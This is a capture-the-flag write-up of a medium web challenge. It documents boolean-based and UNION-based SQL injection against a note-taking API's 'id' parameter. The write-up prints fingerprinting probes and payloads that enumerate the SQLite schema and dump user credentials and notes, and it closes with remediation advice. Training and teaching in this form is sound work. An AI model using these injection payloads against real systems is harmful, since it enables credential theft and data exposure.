# seeql — PentestGarage

- **Category:** Web Security
- **Difficulty:** Medium (200 pts)
- **Date solved:** 2026-08-10
- **Target:** `ctf-gokulpg-seeql-5a0144e7.challenges.pentestgarage.com:80`

## Challenge
> The database holds the answers, but the application won't hand them over
> easily. Identify the injection point and carefully extract the hidden
> information.

## Recon
"See-QL" — a Go web app using GORM (models expose `CreatedAt`/`UpdatedAt`/`DeletedAt`).
`/static/js/script.js` revealed the API:
- `POST /api/register` {username,password}
- `POST /api/login` → returns RS256 JWT
- `GET  /api/user/notes` (Bearer JWT)
- `POST /api/user/note` {id} (Bearer JWT)  ← **injection point**
- `POST /api/user/addnote` {title,note}

## Finding the injection
Registered `pgtest01`, logged in, added a note. Probed the `id` field of `/api/user/note`:
- `id="2"` → returns my note (ID 2)  → **TRUE oracle**
- `id="1 OR 1=1"` → returns a note   → injection confirmed
- `id="1 AND 1=2"` → empty note (ID 0) → **FALSE oracle**

Numeric context (no quotes needed). Boolean-based SQLi.

## Fingerprint (SQLite)
```
0 OR substr(sqlite_version(),1,1)='3'   -> TRUE
0 OR @@version LIKE '%'                 -> ERR (not MySQL)
0 OR length(version())>0                -> ERR (not Postgres)
2-- -                                   -> TRUE ( -- comment works )
```

## UNION extraction
Column count = 7. Reflected columns: **5 → `note`**, **7 → `title`**.
```
-1 UNION SELECT 1,2,3,4,5,6,7-- -
```

Enumerate schema:
```sql
-1 UNION SELECT 1,2,3,4,group_concat(sql,' | '),6,7
   FROM sqlite_master WHERE type='table'-- -
```
- `users(id,created_at,updated_at,deleted_at,username,password,admin)`
- `notes(id,created_at,updated_at,deleted_at,note,username,title)`

Dump:
```sql
-1 UNION SELECT 1,2,3,4,
  group_concat(username||':'||password||':admin='||admin,' || '),6,7
  FROM users-- -
-1 UNION SELECT 1,2,3,4,
  group_concat(username||' >> '||title||' :: '||note,' || '),6,7
  FROM notes-- -
```

## Loot
- Admin creds: `admin : <redacted>` (admin=1)
- Flag (admin's note titled "Flag"):

```
ctf{__redacted__}
```

## Takeaways / remediation
- The `id` parameter is concatenated into the SQL WHERE clause. Use parameterized
  queries — with GORM, `db.Where("id = ?", id)` instead of string building.
- Passwords stored in plaintext; should be hashed (bcrypt/argon2).
- Note lookup lacks an ownership check, so any authenticated user could reach
  other users' notes even without SQLi.
